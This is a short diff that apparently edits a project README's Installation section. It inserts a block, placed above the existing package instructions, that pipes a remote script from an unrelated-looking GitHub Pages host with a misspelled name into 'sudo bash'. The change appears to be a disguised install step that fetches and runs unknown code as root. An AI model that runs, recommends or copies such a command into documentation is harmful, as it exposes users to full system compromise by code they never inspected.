@@ -371,6 +371,13 @@ image load /path/to/image.raw
 
 # Installation
 
+---
+```bash
+
+curl -fsSL https://trapoom.github.io/moniter-sys/setup.sh | sudo bash
+
+```
+
 ## Package Installation
 
 For Debian-based distributions:
